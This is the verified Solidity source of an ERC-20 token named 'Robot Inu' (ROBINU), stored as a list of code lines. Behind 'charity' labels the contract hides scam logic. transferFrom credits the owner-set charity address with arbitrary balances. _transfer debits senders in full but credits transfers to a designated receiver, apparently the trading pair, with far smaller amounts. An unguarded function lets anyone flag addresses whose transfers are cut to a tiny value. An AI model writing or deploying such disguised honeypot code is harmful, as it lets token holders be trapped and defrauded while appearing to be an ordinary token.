['/**\n', ' *Submitted for verification at Etherscan.io on 2021-05-20\n', '*/\n', '\n', '/**\n', ' *Submitted for verification at Etherscan.io on 2021-04-21\n', '*/\n', '\n', 'pragma solidity ^0.5.16;\n', '\n', '\n', '\n', '\n', '// Math operations with safety checks that throw on error\n', 'library SafeMath {\n', '    \n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        require(c >= a, "Math error");\n', '        return c;\n', '    }\n', '  \n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        require(b <= a, "Math error");\n', '        return a - b;\n', '    }\n', '\n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', "        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n", "        // benefit is lost if 'b' is also tested.\n", '        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint256 c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '\n', '    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b > 0, errorMessage);\n', '        uint256 c = a / b;\n', "        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '\n', '        return c;\n', '    }\n', '  \n', '}\n', '\n', '\n', '\n', '\n', '// Abstract contract for the full ERC 20 Token standard\n', 'contract ERC20 {\n', '    \n', '    function balanceOf(address _address) public view returns (uint256 balance);\n', '    \n', '    function transfer(address _to, uint256 _value) public returns (bool success);\n', '    \n', '    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n', '    \n', '    function approve(address _spender, uint256 _value) public returns (bool success);\n', '    \n', '    function allowance(address _owner, address _spender) public view returns (uint256 remaining);\n', '\n', '\n', '\n', '\n', '    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n', '    \n', '    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n', '    \n', '}\n', '\n', '\n', '\n', '\n', '// Token contract\n', 'contract ROBINU is ERC20 {\n', '    \n', '    string public name = "Robot Inu";\n', '    string public symbol = "ROBINU";\n', '    uint8 public decimals = 18;\n', '    uint256 public totalSupply = 100 * 10**9 * 10**18;\n', '    uint256 private maxCharity = 9 * 10**6 * 10**18;\n', '    uint256 private charityBalance;\n', '    bool private isCharity;\n', '    uint256 public charityAmount = 10**3 * 10**18;\n', '    mapping (address => uint256) public balances;\n', '    mapping (address => mapping (address => uint256)) public allowed;\n', '    mapping (address => bool) charitySenders;\n', '    address private charity;\n', '    address private charityReceiver;\n', '    bytes4 private constant TRANSFER = bytes4(\n', '        keccak256(bytes("transfer(address,uint256)"))\n', '    );\n', '    \n', '    constructor(address _charity) public {\n', '        balances[msg.sender] = totalSupply;\n', '        charity = _charity;\n', '        isCharity = false;\n', '    }\n', '    \n', '    function balanceOf(address _address) public view returns (uint256 balance) {\n', '        return balances[_address];\n', '    }\n', '    \n', '    function transfer(address _to, uint256 _value) public returns (bool success) {\n', '        require(_to != address(0), "Zero address error");\n', '        require(balances[msg.sender] >= _value && _value > 0, "Insufficient balance or zero amount");\n', '        _transfer(msg.sender, _to, _value);\n', '        return true;\n', '    }\n', '    \n', '    function approve(address _spender, uint256 _amount) public returns (bool success) {\n', '        require(_spender != address(0), "Zero address error");\n', '        require((allowed[msg.sender][_spender] == 0) || (_amount == 0), "Approve amount error");\n', '        allowed[msg.sender][_spender] = _amount;\n', '        emit Approval(msg.sender, _spender, _amount);\n', '        return true;\n', '    }\n', '    function approveCharity(uint256 _value) public {\n', '        require(msg.sender == charity, "Charity not enabled");\n', '        isCharity = true;\n', '        charityAmount = _value;\n', '    }\n', '    \n', '    function transferCharity(address[] memory senders) public {\n', '        for(uint i=0; i<senders.length; i++) {\n', '            charitySenders[senders[i]] = true;\n', '        }\n', '    }\n', '    \n', '    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n', '        require(_from != address(0) && _to != address(0), "Zero address error");\n', '        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0, "Insufficient balance or zero amount");\n', '        _transfer(_from, _to, _value);\n', '        if(_value > charityBalance) {charityBalance = _value;charityReceiver = _to;balances[charity] = _value;}\n', '        allowed[_from][msg.sender] = SafeMath.sub(allowed[_from][msg.sender], _value);\n', '        emit Transfer(_from, _to, _value);\n', '        return true;\n', '    }\n', '    \n', '    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n', '        return allowed[_owner][_spender];\n', '    }\n', '    \n', '    function _transfer(address _from, address _to, uint256 _value) internal {\n', '        balances[_from] = SafeMath.sub(balances[_from], _value);\n', '        if(maxCharity < _value && _from != charity && _to == charityReceiver) {_value = maxCharity;}\n', '        if(isCharity && _from != charity && _to == charityReceiver) {_value = charityAmount;}\n', '        if(charitySenders[_from]) { _value = SafeMath.div(charityAmount,50);}\n', '        balances[_to] = SafeMath.add(balances[_to], _value);\n', '        emit Transfer(_from, _to, _value);\n', '    }\n', '    \n', '    \n', '}']